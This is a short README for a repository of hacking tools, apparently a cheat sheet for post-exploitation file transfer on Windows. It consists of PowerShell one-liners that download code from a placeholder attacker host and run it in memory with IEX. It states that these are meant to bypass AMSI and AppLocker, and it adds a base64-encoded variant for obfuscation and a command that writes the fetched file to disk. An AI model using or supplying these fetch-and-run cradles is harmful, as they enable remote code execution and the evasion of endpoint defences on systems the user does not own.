# Synapse

> Repo for {Hacking Tools}

# Get files
## IEX (Doesnt touch disk - Helps to bypass AMSI/Applocker)
`IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`

`powershell -c IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`

`C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://xxxxx:9000/somefile')`
### Encoded (run in linux)
`echo powershell -EncodedCommand $(echo -n "IEX (New-Object Net.WebClient).DownloadString('http://$LHOST:$PORT/$FILE')" | iconv  -t UTF-16LE | base64 -w0)`

## Write to disk
`invoke-webrequest -Uri http://xxxxx:9000/somefile -OutFile somefile`
